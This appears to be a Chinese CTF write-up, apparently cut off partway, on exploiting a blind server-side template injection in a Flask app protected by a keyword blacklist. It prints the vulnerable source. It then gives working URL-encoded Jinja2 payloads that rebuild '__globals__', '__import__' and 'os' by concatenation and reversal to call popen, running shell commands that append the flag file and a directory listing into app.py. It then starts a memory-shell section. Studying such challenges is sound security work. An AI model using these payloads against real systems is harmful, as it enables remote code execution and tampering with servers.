@@ -1,0 +1,380 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>昨天打国赛遇见一个无回显ssti的题目，顺便学习了一下<br/>
+源码：</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">html</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"GET"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">source</span><span class="p">():</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s1">'&lt;pre&gt;'</span> <span class="o">+</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span> <span class="o">+</span> <span class="s1">'&lt;/pre&gt;'</span>
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"POST"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">template</span><span class="p">():</span>
+    <span class="n">template_code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"code"</span><span class="p">)</span>
+    <span class="c1"># 安全过滤</span>
+    <span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'__'</span><span class="p">,</span> <span class="s1">'import'</span><span class="p">,</span> <span class="s1">'os'</span><span class="p">,</span> <span class="s1">'sys'</span><span class="p">,</span> <span class="s1">'eval'</span><span class="p">,</span> <span class="s1">'subprocess'</span><span class="p">,</span> <span class="s1">'popen'</span><span class="p">,</span> <span class="s1">'system'</span><span class="p">,</span> <span class="s1">'</span><span class="se">\r</span><span class="s1">'</span><span class="p">,</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">]</span>
+    <span class="k">for</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">template_code</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s2">"Forbidden content detected!"</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template_code</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s1">'ok'</span> <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="k">else</span> <span class="s1">'error'</span>
+
+
+<span class="k">class</span> <span class="nc">HTTPProxyHandler</span><span class="p">:</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">target_host</span> <span class="o">=</span> <span class="n">target_host</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">target_port</span> <span class="o">=</span> <span class="n">target_port</span>
+
+    <span class="k">def</span> <span class="nf">handle_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client_socket</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">request_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                <span class="n">chunk</span> <span class="o">=</span> <span class="n">client_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+                <span class="n">request_data</span> <span class="o">+=</span> <span class="n">chunk</span>
+                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4096</span><span class="p">:</span>
+                    <span class="k">break</span>
+
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">request_data</span><span class="p">:</span>
+                <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                <span class="k">return</span>
+
+            <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">proxy_socket</span><span class="p">:</span>
+                <span class="n">proxy_socket</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="bp">self</span><span class="o">.</span><span class="n">target_host</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">target_port</span><span class="p">))</span>
+                <span class="n">proxy_socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">request_data</span><span class="p">)</span>
+
+                <span class="n">response_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+                <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                    <span class="n">chunk</span> <span class="o">=</span> <span class="n">proxy_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+                    <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
+                        <span class="k">break</span>
+                    <span class="n">response_data</span> <span class="o">+=</span> <span class="n">chunk</span>
+
+            <span class="n">header_end</span> <span class="o">=</span> <span class="n">response_data</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">header_end</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+                <span class="n">body</span> <span class="o">=</span> <span class="n">response_data</span><span class="p">[</span><span class="n">header_end</span> <span class="o">+</span> <span class="mi">4</span><span class="p">:]</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">body</span> <span class="o">=</span> <span class="n">response_data</span>
+
+            <span class="n">response_body</span> <span class="o">=</span> <span class="n">body</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"HTTP/1.1 200 OK</span><span class="se">\r\n</span><span class="s2">"</span> \
+                       <span class="sa">b</span><span class="s2">"Content-Length: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">response_body</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> \
+                                                                                <span class="sa">b</span><span class="s2">"Content-Type: text/html; charset=utf-8</span><span class="se">\r\n</span><span class="s2">"</span> \
+                                                                                <span class="sa">b</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> <span class="o">+</span> <span class="n">response_body</span>
+
+            <span class="n">client_socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Proxy Error: {e}"</span><span class="p">)</span>
+        <span class="k">finally</span><span class="p">:</span>
+            <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">start_proxy_server</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">):</span>
+    <span class="n">proxy_handler</span> <span class="o">=</span> <span class="n">HTTPProxyHandler</span><span class="p">(</span><span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">)</span>
+    <span class="n">server_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">server_socket</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+    <span class="n">server_socket</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Proxy server is running on {host}:{port} and forwarding to {target_host}:{target_port}..."</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">client_socket</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">server_socket</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Connection from {addr}"</span><span class="p">)</span>
+            <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">proxy_handler</span><span class="o">.</span><span class="n">handle_request</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">client_socket</span><span class="p">,))</span>
+            <span class="n">thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">"Shutting down proxy server..."</span><span class="p">)</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="n">server_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">run_flask_app</span><span class="p">():</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">proxy_host</span> <span class="o">=</span> <span class="s2">"0.0.0.0"</span>
+    <span class="n">proxy_port</span> <span class="o">=</span> <span class="mi">5001</span>
+    <span class="n">target_host</span> <span class="o">=</span> <span class="s2">"127.0.0.1"</span>
+    <span class="n">target_port</span> <span class="o">=</span> <span class="mi">5000</span>
+
+    <span class="c1"># 安全反代，防止针对响应头的攻击</span>
+    <span class="n">proxy_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">start_proxy_server</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">proxy_host</span><span class="p">,</span> <span class="n">proxy_port</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+    <span class="n">proxy_thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">proxy_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s2">"Starting Flask app..."</span><span class="p">)</span>
+    <span class="n">run_flask_app</span><span class="p">()</span>
+</pre></div>
+<p>可以看见有黑名单：</p>
+<div class="highlight"><pre><span></span><span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'__'</span><span class="p">,</span> <span class="s1">'import'</span><span class="p">,</span> <span class="s1">'os'</span><span class="p">,</span> <span class="s1">'sys'</span><span class="p">,</span> <span class="s1">'eval'</span><span class="p">,</span> <span class="s1">'subprocess'</span><span class="p">,</span> <span class="s1">'popen'</span><span class="p">,</span> <span class="s1">'system'</span><span class="p">,</span> <span class="s1">'</span><span class="se">\r</span><span class="s1">'</span><span class="p">,</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">]</span>
+</pre></div>
+<h2 data-content="1" id="a536e1d1ee51c93af8d9191767e66369">写文件</h2>
+<p>第一种方法就是传统的绕过黑名单，采用拼接的方法<br/>
+请看payload：</p>
+<div class="highlight"><pre><span></span><span class="n">code</span><span class="o">=</span><span class="p">{</span><span class="o">%</span><span class="mi">25</span><span class="nb">set</span><span class="o">+</span><span class="n">gl</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="mi">2</span><span class="sa">b</span><span class="s1">'globals'</span><span class="o">%</span><span class="mi">2</span><span class="sa">b</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="mi">25</span><span class="p">}{</span><span class="o">%</span><span class="mi">25</span><span class="nb">set</span><span class="o">+</span><span class="n">bu</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="mi">2</span><span class="sa">b</span><span class="s1">'builtins'</span><span class="o">%</span><span class="mi">2</span><span class="sa">b</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="mi">25</span><span class="p">}{</span><span class="o">%</span><span class="mi">25</span><span class="nb">set</span><span class="o">+</span><span class="n">im</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="mi">2</span><span class="sa">b</span><span class="s1">'i''mport'</span><span class="o">%</span><span class="mi">2</span><span class="sa">b</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="mi">25</span><span class="p">}{</span><span class="o">%</span><span class="mi">25</span><span class="nb">set</span><span class="o">+</span><span class="n">hc</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s1">'so'</span><span class="p">[</span><span class="o">%</span><span class="mi">3</span><span class="n">a</span><span class="o">%</span><span class="mi">3</span><span class="n">a</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">%</span><span class="mi">25</span><span class="p">}{{</span><span class="n">g</span><span class="o">.</span><span class="n">pop</span><span class="p">[</span><span class="n">gl</span><span class="p">][</span><span class="n">bu</span><span class="p">][</span><span class="n">im</span><span class="p">](</span><span class="n">hc</span><span class="p">)[</span><span class="s1">'p''open'</span><span class="p">](</span><span class="s1">'cat+/f*&gt;&gt;app.py'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+
+<span class="n">url解码后是这个样子的</span><span class="err">：</span>
+<span class="n">code</span><span class="o">=</span><span class="p">{</span><span class="o">%</span><span class="nb">set</span><span class="o">+</span><span class="n">gl</span><span class="o">=</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s1">'globals'</span><span class="o">+</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span><span class="o">+</span><span class="n">bu</span><span class="o">=</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s1">'builtins'</span><span class="o">+</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span><span class="o">+</span><span class="n">im</span><span class="o">=</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s1">'i''mport'</span><span class="o">+</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">set</span><span class="o">+</span><span class="n">hc</span><span class="o">=</span><span class="s1">'so'</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">%</span><span class="p">}{{</span><span class="n">g</span><span class="o">.</span><span class="n">pop</span><span class="p">[</span><span class="n">gl</span><span class="p">][</span><span class="n">bu</span><span class="p">][</span><span class="n">im</span><span class="p">](</span><span class="n">hc</span><span class="p">)[</span><span class="s1">'p''open'</span><span class="p">](</span><span class="s1">'cat+/f*&gt;&gt;app.py'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</pre></div>
+<p>它使用了 Jinja2 的 {% set %} 语句来创建变量，并且通过这些变量来访问和操作 Python 的全局环境 (globals) 和内置函数 (builtins)</p>
+<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="o">...</span> <span class="o">%</span><span class="p">}</span> <span class="o">//</span><span class="err">用于在模板中设置变量。</span>
+
+<span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s1">'globals'</span><span class="o">+</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span> <span class="o">//</span><span class="err">用来构造字符串</span> <span class="vm">__globals__</span> <span class="err">和</span> <span class="n">__builtins__</span>
+
+<span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s1">'import'</span><span class="o">+</span><span class="s1">'_'</span><span class="o">*</span><span class="mi">2</span> <span class="o">//</span><span class="err">试图构造字符串</span> <span class="nb">__import__</span>
+
+<span class="s1">'so'</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">//</span><span class="err">将字符串</span> <span class="s1">'so'</span> <span class="err">反转为</span> <span class="s1">'os'</span>
+
+<span class="n">g</span><span class="o">.</span><span class="n">pop</span><span class="p">[</span><span class="n">gl</span><span class="p">][</span><span class="n">bu</span><span class="p">][</span><span class="n">im</span><span class="p">](</span><span class="n">hc</span><span class="p">)[</span><span class="s1">'p''open'</span><span class="p">](</span><span class="s1">'cat+/f*&gt;&gt;app.py'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="o">//</span><span class="err">这部分代码从</span> <span class="nb">globals</span> <span class="err">获取</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span> <span class="err">函数，然后用它来导入</span> <span class="n">os</span> <span class="err">模块，并调用</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span> <span class="err">来执行</span> <span class="n">shell</span> <span class="err">命令</span> <span class="n">cat</span> <span class="o">/</span><span class="n">f</span><span class="o">*&gt;&gt;</span><span class="n">app</span><span class="o">.</span><span class="n">py</span><span class="err">，这会将根目录下所有以</span> <span class="n">f</span> <span class="err">开头的文件内容追加到</span> <span class="n">app</span><span class="o">.</span><span class="n">py</span> <span class="err">文件中。</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216124118-fd8002ca-bb67-1.png"/><br/>
+访问首页发现成功写入<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216124309-3fd4a14e-bb68-1.png"/><br/>
+还可以对首页进行覆盖 payload:</p>
+<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span><span class="mi">25</span><span class="nb">set</span><span class="o">+</span><span class="n">gl</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s1">''</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="mi">2</span><span class="sa">b</span><span class="s1">'globals'</span><span class="o">%</span><span class="mi">2</span><span class="sa">b</span><span class="s1">''</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="mi">25</span><span class="p">}{</span><span class="o">%</span><span class="mi">25</span><span class="nb">set</span><span class="o">+</span><span class="n">bu</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s1">''</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="mi">2</span><span class="sa">b</span><span class="s1">'builtins'</span><span class="o">%</span><span class="mi">2</span><span class="sa">b</span><span class="s1">''</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="mi">25</span><span class="p">}{</span><span class="o">%</span><span class="mi">25</span><span class="nb">set</span><span class="o">+</span><span class="n">im</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s1">''</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="mi">2</span><span class="sa">b</span><span class="s1">'i''mport'</span><span class="o">%</span><span class="mi">2</span><span class="sa">b</span><span class="s1">''</span><span class="o">*</span><span class="mi">2</span><span class="o">%</span><span class="mi">25</span><span class="p">}{</span><span class="o">%</span><span class="mi">25</span><span class="nb">set</span><span class="o">+</span><span class="n">mx</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s1">'so'</span><span class="p">[</span><span class="o">%</span><span class="mi">3</span><span class="n">a</span><span class="o">%</span><span class="mi">3</span><span class="n">a</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">%</span><span class="mi">25</span><span class="p">}{{</span><span class="n">cycler</span><span class="o">.</span><span class="n">next</span><span class="p">[</span><span class="n">gl</span><span class="p">][</span><span class="n">bu</span><span class="p">]</span><span class="n">im</span><span class="s1">'p''open'</span><span class="p">(</span><span class="s1">'ls+/&gt;&gt;app.py'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216140750-147173a4-bb74-1.jpeg"/><br/>
+访问首页<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216140742-0fbde7f2-bb74-1.jpeg"/></p>
+<h1 data-content="1" id="ae3e37bba5cb00e93e978806506363ab">内存马</h1>
+<p>测试代码：</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">html</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"GET"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">source</span><span class="p">():</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s1">'&lt;pre&gt;'</span> <span class="o">+</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span> <span class="o">+</span> <span class="s1">'&lt;/pre&gt;'</span>
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"POST"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">template</span><span class="p">():</span>
+    <span class="n">template_code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"code"</span><span class="p">)</span>
+    <span class="c1"># 安全过滤</span>
+   <span class="c1"># blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']</span>
+   <span class="c1">#  for black in blacklist:</span>
+   <span class="c1">#      if black in template_code:</span>
+   <span class="c1">#          return "Forbidden content detected!"</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template_code</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s1">'ok'</span> <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="k">else</span> <span class="s1">'error'</span>
+
+
+<span class="k">class</span> <span class="nc">HTTPProxyHandler</span><span class="p">:</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">target_host</span> <span class="o">=</span> <span class="n">target_host</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">target_port</span> <span class="o">=</span> <span class="n">target_port</span>
+
+    <span class="k">def</span> <span class="nf">handle_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client_socket</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">request_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                <span class="n">chunk</span> <span class="o">=</span> <span class="n">client_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+                <span class="n">request_data</span> <span class="o">+=</span> <span class="n">chunk</span>
+                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4096</span><span class="p">:</span>
+                    <span class="k">break</span>
+
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">request_data</span><span class="p">:</span>
+                <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                <span class="k">return</span>
+
+            <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">proxy_socket</span><span class="p">:</span>
+                <span class="n">proxy_socket</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="bp">self</span><span class="o">.</span><span class="n">target_host</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">target_port</span><span class="p">))</span>
+                <span class="n">proxy_socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">request_data</span><span class="p">)</span>
+
+                <span class="n">response_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+                <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                    <span class="n">chunk</span> <span class="o">=</span> <span class="n">proxy_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+                    <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
+                        <span class="k">break</span>
+                    <span class="n">response_data</span> <span class="o">+=</span> <span class="n">chunk</span>
+
+            <span class="n">header_end</span> <span class="o">=</span> <span class="n">response_data</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">header_end</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+                <span class="n">body</span> <span class="o">=</span> <span class="n">response_data</span><span class="p">[</span><span class="n">header_end</span> <span class="o">+</span> <span class="mi">4</span><span class="p">:]</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">body</span> <span class="o">=</span> <span class="n">response_data</span>
+
+            <span class="n">response_body</span> <span class="o">=</span> <span class="n">body</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"HTTP/1.1 200 OK</span><span class="se">\r\n</span><span class="s2">"</span> \
+                       <span class="sa">b</span><span class="s2">"Content-Length: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">response_body</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> \
+                                                                                <span class="sa">b</span><span class="s2">"Content-Type: text/html; charset=utf-8</span><span class="se">\r\n</span><span class="s2">"</span> \
+                                                                                <span class="sa">b</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> <span class="o">+</span> <span class="n">response_body</span>
+
+            <span class="n">client_socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Proxy Error: {e}"</span><span class="p">)</span>
+        <span class="k">finally</span><span class="p">:</span>
+            <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+
